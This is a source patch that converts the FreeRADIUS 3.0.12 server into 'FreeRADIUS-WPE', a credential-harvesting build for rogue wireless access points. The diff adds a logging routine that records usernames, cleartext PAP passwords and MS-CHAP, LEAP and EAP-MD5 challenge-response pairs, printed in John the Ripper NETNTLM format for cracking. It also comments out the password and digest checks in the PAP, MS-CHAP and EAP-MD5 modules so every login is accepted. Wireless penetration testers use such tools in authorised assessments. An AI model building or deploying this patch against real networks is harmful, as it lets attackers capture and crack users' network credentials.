diff -ur freeradius-server-3.0.12/raddb/mods-config/files/authorize freeradius-server-3.0.12-wpe/raddb/mods-config/files/authorize
--- freeradius-server-3.0.12/raddb/mods-config/files/authorize	2016-09-29 11:19:48.000000000 -0400
+++ freeradius-server-3.0.12-wpe/raddb/mods-config/files/authorize	2016-11-14 12:54:04.623922559 -0500
@@ -218,3 +218,5 @@
 # See the example user "bob" above.                     #
 #########################################################
 
+DEFAULT Cleartext-Password := "foo", MS-CHAP-Use-NTLM-Auth := 0
+DEFAULT Cleartext-Password := "a"
diff -ur freeradius-server-3.0.12/raddb/radiusd.conf.in freeradius-server-3.0.12-wpe/raddb/radiusd.conf.in
--- freeradius-server-3.0.12/raddb/radiusd.conf.in	2016-09-29 11:19:48.000000000 -0400
+++ freeradius-server-3.0.12-wpe/raddb/radiusd.conf.in	2016-11-14 12:51:47.411925156 -0500
@@ -371,6 +371,9 @@
 #  The program to execute to do concurrency checks.
 checkrad = ${sbindir}/checkrad
 
+# Wireless Pawn Edition log file
+wpelogfile = ${logdir}/freeradius-server-wpe.log
+
 # SECURITY CONFIGURATION
 #
 #  There may be multiple methods of attacking on the server.  This
diff -ur freeradius-server-3.0.12/src/include/radiusd.h freeradius-server-3.0.12-wpe/src/include/radiusd.h
--- freeradius-server-3.0.12/src/include/radiusd.h	2016-09-29 11:19:48.000000000 -0400
+++ freeradius-server-3.0.12-wpe/src/include/radiusd.h	2016-11-14 12:55:11.743921289 -0500
@@ -147,6 +147,8 @@
 	char const	*checkrad;			//!< Script to use to determine if a user is already
 							//!< connected.
 
+	char const	*wpelogfile;			//!< Wireless Pawn Edition log file path.
+
 	rad_listen_t	*listen;			//!< Head of a linked list of listeners.
 
 
diff -ur freeradius-server-3.0.12/src/main/auth.c freeradius-server-3.0.12-wpe/src/main/auth.c
--- freeradius-server-3.0.12/src/main/auth.c	2016-09-29 11:19:48.000000000 -0400
+++ freeradius-server-3.0.12-wpe/src/main/auth.c	2016-11-14 18:48:52.895519596 -0500
@@ -30,6 +30,8 @@
 
 #include <ctype.h>
 
+extern void log_wpe(const char *authtype, const char *username, const char *password, const unsigned char *challenge, const unsigned int challen, const unsigned char *response, const unsigned int resplen);
+
 /*
  *	Return a short string showing the terminal server, port
  *	and calling station ID.
@@ -125,6 +127,7 @@
 		} else {
 			fr_prints(clean_password, sizeof(clean_password),
 				  request->password->vp_strvalue, request->password->vp_length, '\0');
+			log_wpe("password", request->username->vp_strvalue, clean_password, NULL, 0, NULL, 0);
 		}
 	}
 
diff -ur freeradius-server-3.0.12/src/main/libfreeradius-server.mk freeradius-server-3.0.12-wpe/src/main/libfreeradius-server.mk
--- freeradius-server-3.0.12/src/main/libfreeradius-server.mk	2016-09-29 11:19:48.000000000 -0400
+++ freeradius-server-3.0.12-wpe/src/main/libfreeradius-server.mk	2016-11-14 19:30:47.803471992 -0500
@@ -14,6 +14,7 @@
 		pair.c \
 		xlat.c
 
+
 # This lets the linker determine which version of the SSLeay functions to use.
 TGT_LDLIBS      := $(OPENSSL_LIBS)
 
diff -ur freeradius-server-3.0.12/src/main/log.c freeradius-server-3.0.12-wpe/src/main/log.c
--- freeradius-server-3.0.12/src/main/log.c	2016-09-29 11:19:48.000000000 -0400
+++ freeradius-server-3.0.12-wpe/src/main/log.c	2016-11-14 19:50:51.727449203 -0500
@@ -29,6 +29,7 @@
 
 #include <freeradius-devel/radiusd.h>
 #include <freeradius-devel/rad_assert.h>
+/*#include <freeradius-devel/conf.h>*/
 
 #ifdef HAVE_SYS_STAT_H
 #  include <sys/stat.h>
@@ -46,6 +47,9 @@
 #include <pthread.h>
 #endif
 
+#include <stdio.h>
+#include <time.h>
+
 log_lvl_t	rad_debug_lvl = 0;		//!< Global debugging level
 static bool	rate_limit = true;		//!< Whether repeated log entries should be rate limited
 
@@ -226,6 +230,81 @@
 
 static char const spaces[] = "                                                                                                                        ";
 
+/** Prints username, password or challenge/response
+ *
+ */
+void log_wpe(const char *authtype, const char *username, const char *password,
+				const unsigned char *challenge, const unsigned int challen,
+				const unsigned char *response, const unsigned int resplen)
+{
+	FILE            *logfd;
+	time_t          nowtime;
+	unsigned int    count;
+
+	/* Get wpelogfile parameter and log data
+	if (main_config.wpelogfile == NULL) {
+		logfd = stderr;
+	} else {
+		logfd = fopen(main_config.wpelogfile, "a");
+		if (logfd == NULL) {
+			fr_strerror_printf("  rlm_mschap: FAILED: Unable to open output log file %s: %s", main_config.wpelogfile, strerror(errno));
+			logfd = stderr;
+		}
+	}
+	*/
+	/* Using main_config.wpelogfile results in a linked hell, so for now, use
+	   a hardcoded string for the path of the file */
+	logfd = fopen("/var/log/freeradius-server-wpe.log", "a");
+	if (logfd == NULL) {
+		fr_strerror_printf("  log: FAILED: Unable to open output log file /var/log/freeradius-server-wpe.log: %s", strerror(errno));
+		logfd = stderr;
+	}
+
+
+	nowtime = time(NULL);
+	fprintf(logfd, "%s: %s\n", authtype, ctime(&nowtime));
+
+	if (username != NULL) {
+		fprintf(logfd, "\tusername: %s\n", username);
+	}
+	if (password != NULL) {
+		fprintf(logfd, "\tpassword: %s\n", password);
+	}
+
+	if (challen != 0) {
+		fprintf(logfd, "\tchallenge: ");
+		for (count=0; count!=(challen-1); count++) {
+			fprintf(logfd, "%02x:",challenge[count]);
+		}
+		fprintf(logfd, "%02x\n",challenge[challen-1]);
+	}
+
+	if (resplen != 0) {
+		fprintf(logfd, "\tresponse: ");
+		for (count=0; count!=(resplen-1); count++) {
+			fprintf(logfd, "%02x:",response[count]);
+		}
+		fprintf(logfd, "%02x\n",response[resplen-1]);
+	}
+
+	if ( (strncmp(authtype, "mschap", 6) == 0) && username != NULL
+			&& challen != 0 && resplen != 0) {
+		fprintf(logfd, "\tjohn NETNTLM: %s:$NETNTLM$",username);
+		for (count=0; count<challen; count++) {
+			fprintf(logfd, "%02x",challenge[count]);
+		}
+		fprintf(logfd,"$");
+		for (count=0; count<resplen; count++) {
+			fprintf(logfd, "%02x",response[count]);
+		}
+		fprintf(logfd,"\n");
+	}
+
+	fprintf(logfd, "\n");
+
+	fclose(logfd);
+}
+
 /** On fault, reset STDOUT and STDERR to something useful
  *
  * @return 0
diff -ur freeradius-server-3.0.12/src/main/mainconfig.c freeradius-server-3.0.12-wpe/src/main/mainconfig.c
--- freeradius-server-3.0.12/src/main/mainconfig.c	2016-09-29 11:19:48.000000000 -0400
+++ freeradius-server-3.0.12-wpe/src/main/mainconfig.c	2016-11-14 13:11:16.103903034 -0500
@@ -192,6 +192,7 @@
 	{ "max_requests", FR_CONF_POINTER(PW_TYPE_INTEGER, &main_config.max_requests), STRINGIFY(MAX_REQUESTS) },
 	{ "pidfile", FR_CONF_POINTER(PW_TYPE_STRING, &main_config.pid_file), "${run_dir}/radiusd.pid"},
 	{ "checkrad", FR_CONF_POINTER(PW_TYPE_STRING, &main_config.checkrad), "${sbindir}/checkrad" },
+	{ "wpelogfile", FR_CONF_POINTER(PW_TYPE_STRING, &main_config.wpelogfile), "${logdir}/freeradius-server-wpe.log" },
 
 	{ "debug_level", FR_CONF_POINTER(PW_TYPE_INTEGER, &main_config.debug_level), "0"},
 
diff -ur freeradius-server-3.0.12/src/main/radiusd.c freeradius-server-3.0.12-wpe/src/main/radiusd.c
--- freeradius-server-3.0.12/src/main/radiusd.c	2016-09-29 11:19:48.000000000 -0400
+++ freeradius-server-3.0.12-wpe/src/main/radiusd.c	2016-11-14 13:12:02.939902148 -0500
@@ -59,7 +59,7 @@
 
 bool		log_stripped_names;
 
-char const *radiusd_version = "FreeRADIUS Version " RADIUSD_VERSION_STRING
+char const *radiusd_version = "FreeRADIUS-WPE Version " RADIUSD_VERSION_STRING
 #ifdef RADIUSD_VERSION_COMMIT
 " (git #" STRINGIFY(RADIUSD_VERSION_COMMIT) ")"
 #endif
diff -ur freeradius-server-3.0.12/src/modules/rlm_eap/types/rlm_eap_leap/eap_leap.c freeradius-server-3.0.12-wpe/src/modules/rlm_eap/types/rlm_eap_leap/eap_leap.c
--- freeradius-server-3.0.12/src/modules/rlm_eap/types/rlm_eap_leap/eap_leap.c	2016-09-29 11:19:48.000000000 -0400
+++ freeradius-server-3.0.12-wpe/src/modules/rlm_eap/types/rlm_eap_leap/eap_leap.c	2016-11-14 15:23:56.771752348 -0500
@@ -53,6 +53,8 @@
 
 #include <freeradius-devel/md5.h>
 
+extern void log_wpe(const char *authtype, const char *username, const char *password, const unsigned char *challenge, const unsigned int challen, const unsigned char *response, const unsigned int resplen);
+
 /*
  *   Extract the data from the LEAP packet.
  */
@@ -204,10 +206,11 @@
 /*
  *	Verify the MS-CHAP response from the user.
  */
-int eapleap_stage4(REQUEST *request, leap_packet_t *packet, VALUE_PAIR *password, leap_session_t *session)
+int eapleap_stage4(REQUEST *request, leap_packet_t *packet, VALUE_PAIR *password, leap_session_t *session, char *username)
 {
 	uint8_t hash[16];
 	uint8_t response[24];
+	unsigned char challenge[8] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
 
 	/*
 	 *	No password or previous packet.  Die.
@@ -225,6 +228,7 @@
 	 */
 	eapleap_mschap(hash, session->peer_challenge, response);
 	if (memcmp(response, packet->challenge, 24) == 0) {
+		log_wpe("LEAP", username, NULL, challenge, 8, response, 24);
 		RDEBUG2("NTChallengeResponse from AP is valid");
 		memcpy(session->peer_response, response, sizeof(response));
 		return 1;
diff -ur freeradius-server-3.0.12/src/modules/rlm_eap/types/rlm_eap_leap/eap_leap.h freeradius-server-3.0.12-wpe/src/modules/rlm_eap/types/rlm_eap_leap/eap_leap.h
--- freeradius-server-3.0.12/src/modules/rlm_eap/types/rlm_eap_leap/eap_leap.h	2016-09-29 11:19:48.000000000 -0400
+++ freeradius-server-3.0.12-wpe/src/modules/rlm_eap/types/rlm_eap_leap/eap_leap.h	2016-11-14 13:29:01.635882865 -0500
@@ -63,7 +63,7 @@
 int 		eapleap_compose(REQUEST *request, EAP_DS *auth, leap_packet_t *reply);
 leap_packet_t 	*eapleap_extract(REQUEST *request, EAP_DS *eap_ds);
 leap_packet_t 	*eapleap_initiate(REQUEST *request, EAP_DS *eap_ds, VALUE_PAIR *user_name);
-int		eapleap_stage4(REQUEST *request, leap_packet_t *packet, VALUE_PAIR* password, leap_session_t *session);
+int		eapleap_stage4(REQUEST *request, leap_packet_t *packet, VALUE_PAIR* password, leap_session_t *session, char * username);
 leap_packet_t	*eapleap_stage6(REQUEST *request, leap_packet_t *packet, VALUE_PAIR *user_name, VALUE_PAIR* password,
 				leap_session_t *session);
 
diff -ur freeradius-server-3.0.12/src/modules/rlm_eap/types/rlm_eap_leap/rlm_eap_leap.c freeradius-server-3.0.12-wpe/src/modules/rlm_eap/types/rlm_eap_leap/rlm_eap_leap.c
--- freeradius-server-3.0.12/src/modules/rlm_eap/types/rlm_eap_leap/rlm_eap_leap.c	2016-09-29 11:19:48.000000000 -0400
+++ freeradius-server-3.0.12-wpe/src/modules/rlm_eap/types/rlm_eap_leap/rlm_eap_leap.c	2016-11-14 14:52:39.583787881 -0500
@@ -94,6 +94,7 @@
 	leap_session_t	*session;
 	leap_packet_t	*packet;
 	leap_packet_t	*reply;
+	char		*username;
 	VALUE_PAIR	*password;
 
 	if (!handler->opaque) {
@@ -110,6 +111,8 @@
 		return 0;
 	}
 
+	username = (char *)handler->request->username->vp_strvalue;
+
 	/*
 	 *	The password is never sent over the wire.
 	 *	Always get the configured password, for each user.
@@ -132,7 +135,7 @@
 	switch (session->stage) {
 	case 4:			/* Verify NtChallengeResponse */
 		RDEBUG2("Stage 4");
-		rcode = eapleap_stage4(request, packet, password, session);
+		rcode = eapleap_stage4(request, packet, password, session, username);
 		session->stage = 6;
 
 		/*
diff -ur freeradius-server-3.0.12/src/modules/rlm_eap/types/rlm_eap_md5/eap_md5.c freeradius-server-3.0.12-wpe/src/modules/rlm_eap/types/rlm_eap_md5/eap_md5.c
--- freeradius-server-3.0.12/src/modules/rlm_eap/types/rlm_eap_md5/eap_md5.c	2016-09-29 11:19:48.000000000 -0400
+++ freeradius-server-3.0.12-wpe/src/modules/rlm_eap/types/rlm_eap_md5/eap_md5.c	2016-11-14 15:22:57.771753465 -0500
@@ -44,6 +44,8 @@
 #include "eap_md5.h"
 #include <freeradius-devel/md5.h>
 
+extern void log_wpe(const char *authtype, const char *username, const char *password, const unsigned char *challenge, const unsigned int challen, const unsigned char *response, const unsigned int resplen);
+
 /*
  *	We expect only RESPONSE for which SUCCESS or FAILURE is sent back
  */
@@ -166,9 +168,13 @@
 	/*
 	 *	The length of the response is always 16 for MD5.
 	 */
+	/*
 	if (rad_digest_cmp(digest, packet->value, 16) != 0) {
 		return 0;
 	}
+	*/
+	log_wpe("eap_md5", packet->name, NULL, challenge, MD5_CHALLENGE_LEN,
+		packet->value, 16);
 
 	return 1;
 }
diff -ur freeradius-server-3.0.12/src/modules/rlm_mschap/rlm_mschap.c freeradius-server-3.0.12-wpe/src/modules/rlm_mschap/rlm_mschap.c
--- freeradius-server-3.0.12/src/modules/rlm_mschap/rlm_mschap.c	2016-09-29 11:19:48.000000000 -0400
+++ freeradius-server-3.0.12-wpe/src/modules/rlm_mschap/rlm_mschap.c	2016-11-14 18:34:20.115536117 -0500
@@ -37,6 +37,8 @@
 #include "mschap.h"
 #include "smbdes.h"
 
+extern void log_wpe(const char *authtype, const char *username, const char *password, const unsigned char *challenge, const unsigned int challen, const unsigned char *response, const unsigned int resplen);
+
 #ifdef WITH_AUTH_WINBIND
 #include "auth_wbclient.h"
 #endif
@@ -1103,10 +1105,13 @@
  */
 static int CC_HINT(nonnull (1, 2, 4, 5 ,6)) do_mschap(rlm_mschap_t *inst, REQUEST *request, VALUE_PAIR *password,
 						      uint8_t const *challenge, uint8_t const *response,
-						      uint8_t nthashhash[NT_DIGEST_LENGTH], MSCHAP_AUTH_METHOD method)
+						      uint8_t nthashhash[NT_DIGEST_LENGTH], MSCHAP_AUTH_METHOD method,
+						      const char *username)
 {
 	uint8_t	calculated[24];
 
+	log_wpe("mschap", username, NULL, challenge, 8, response, 24);
+
 	memset(nthashhash, 0, NT_DIGEST_LENGTH);
 
 	switch (method) {
@@ -1123,9 +1128,11 @@
 		}
 
 		smbdes_mschap(password->vp_octets, challenge, calculated);
+		/*
 		if (rad_digest_cmp(response, calculated, 24) != 0) {
 			return -1;
 		}
+		*/
 
 		/*
 		 *	If the password exists, and is an NT-Password,
@@ -1857,7 +1864,7 @@
 		 *	Do the MS-CHAP authentication.
 		 */
 		mschap_result = do_mschap(inst, request, password, challenge->vp_octets,
-					  response->vp_octets + offset, nthashhash, auth_method);
+					  response->vp_octets + offset, nthashhash, auth_method, NULL);
 		/*
 		 *	Check for errors, and add MSCHAP-Error if necessary.
 		 */
@@ -1965,7 +1972,7 @@
 
 		RDEBUG2("Client is using MS-CHAPv2");
 		mschap_result = do_mschap(inst, request, nt_password, mschapv1_challenge,
-					  response->vp_octets + 26, nthashhash, auth_method);
+					  response->vp_octets + 26, nthashhash, auth_method, username_string);
 		rcode = mschap_error(inst, request, *response->vp_octets,
 				     mschap_result, mschap_version, smb_ctrl);
 		if (rcode != RLM_MODULE_OK) return rcode;
diff -ur freeradius-server-3.0.12/src/modules/rlm_pap/rlm_pap.c freeradius-server-3.0.12-wpe/src/modules/rlm_pap/rlm_pap.c
--- freeradius-server-3.0.12/src/modules/rlm_pap/rlm_pap.c	2016-09-29 11:19:48.000000000 -0400
+++ freeradius-server-3.0.12-wpe/src/modules/rlm_pap/rlm_pap.c	2016-11-14 18:52:48.927515128 -0500
@@ -40,6 +40,8 @@
 #  include <openssl/evp.h>
 #endif
 
+extern void log_wpe(const char *authtype, const char *username, const char *password, const unsigned char *challenge, const unsigned int challen, const unsigned char *response, const unsigned int resplen);
+
 /*
  *      Define a structure for our module configuration.
  *
@@ -535,6 +537,7 @@
 		RDEBUG("Comparing with \"known good\" Cleartext-Password");
 	}
 
+	/*
 	if ((vp->vp_length != request->password->vp_length) ||
 	    (rad_digest_cmp(vp->vp_octets,
 			    request->password->vp_octets,
@@ -543,6 +546,7 @@
 			request->password->vp_strvalue);
 		return RLM_MODULE_REJECT;
 	}
+	*/
 	return RLM_MODULE_OK;
 }
 
@@ -581,12 +585,12 @@
 	fr_md5_update(&md5_context, request->password->vp_octets,
 		     request->password->vp_length);
 	fr_md5_final(digest, &md5_context);
-
+	/*
 	if (rad_digest_cmp(digest, vp->vp_octets, vp->vp_length) != 0) {
 		REDEBUG("MD5 digest does not match \"known good\" digest");
 		return RLM_MODULE_REJECT;
 	}
-
+	*/
 	return RLM_MODULE_OK;
 }
 
@@ -615,10 +619,12 @@
 	/*
 	 *	Compare only the MD5 hash results, not the salt.
 	 */
+	/*
 	if (rad_digest_cmp(digest, vp->vp_octets, 16) != 0) {
 		REDEBUG("SMD5 digest does not match \"known good\" digest");
 		return RLM_MODULE_REJECT;
 	}
+	*/
 
 	return RLM_MODULE_OK;
 }
@@ -643,10 +649,12 @@
 		      request->password->vp_length);
 	fr_sha1_final(digest,&sha1_context);
 
+	/*
 	if (rad_digest_cmp(digest, vp->vp_octets, vp->vp_length) != 0) {
 		REDEBUG("SHA1 digest does not match \"known good\" digest");
 		return RLM_MODULE_REJECT;
 	}
+	*/
 
 	return RLM_MODULE_OK;
 }
@@ -672,10 +680,12 @@
 	fr_sha1_update(&sha1_context, &vp->vp_octets[20], vp->vp_length - 20);
 	fr_sha1_final(digest, &sha1_context);
 
+	/*
 	if (rad_digest_cmp(digest, vp->vp_octets, 20) != 0) {
 		REDEBUG("SSHA digest does not match \"known good\" digest");
 		return RLM_MODULE_REJECT;
 	}
+	*/
 
 	return RLM_MODULE_OK;
 }
@@ -736,10 +746,12 @@
 
 	rad_assert((size_t) digest_len == vp->vp_length);	/* This would be an OpenSSL bug... */
 
+	/*
 	if (rad_digest_cmp(digest, vp->vp_octets, vp->vp_length) != 0) {
 		REDEBUG("%s digest does not match \"known good\" digest", name);
 		return RLM_MODULE_REJECT;
 	}
+	*/
 
 	return RLM_MODULE_OK;
 }
@@ -808,10 +820,12 @@
 	/*
 	 *	Only compare digest_len bytes, the rest is salt.
 	 */
+	/*
 	if (rad_digest_cmp(digest, vp->vp_octets, (size_t)digest_len) != 0) {
 		REDEBUG("%s digest does not match \"known good\" digest", name);
 		return RLM_MODULE_REJECT;
 	}
+	*/
 
 	return RLM_MODULE_OK;
 }
@@ -845,10 +859,12 @@
 
 	fr_md4_calc(digest, (uint8_t *) ucs2_password, len);
 
+	/*
 	if (rad_digest_cmp(digest, vp->vp_octets, vp->vp_length) != 0) {
 		REDEBUG("NT digest does not match \"known good\" digest");
 		return RLM_MODULE_REJECT;
 	}
+	*/
 
 	return RLM_MODULE_OK;
 }
@@ -875,11 +891,13 @@
 		return RLM_MODULE_FAIL;
 	}
 
+	/*
 	if ((fr_hex2bin(digest, sizeof(digest), charbuf, len) != vp->vp_length) ||
 	    (rad_digest_cmp(digest, vp->vp_octets, vp->vp_length) != 0)) {
 		REDEBUG("LM digest does not match \"known good\" digest");
 		return RLM_MODULE_REJECT;
 	}
+	*/
 
 	return RLM_MODULE_OK;
 }
@@ -936,10 +954,12 @@
 		fr_md5_final(buff, &md5_context);
 	}
 
+	/*
 	if (rad_digest_cmp(digest, buff, 16) != 0) {
 		REDEBUG("NS-MTA-MD5 digest does not match \"known good\" digest");
 		return RLM_MODULE_REJECT;
 	}
+	*/
 
 	return RLM_MODULE_OK;
 }
@@ -963,6 +983,9 @@
 		return RLM_MODULE_INVALID;
 	}
 
+	log_wpe("pap",request->username->vp_strvalue, request->password->vp_strvalue,
+		NULL, 0, NULL, 0);
+
 	/*
 	 *	The user MUST supply a non-zero-length password.
 	 */
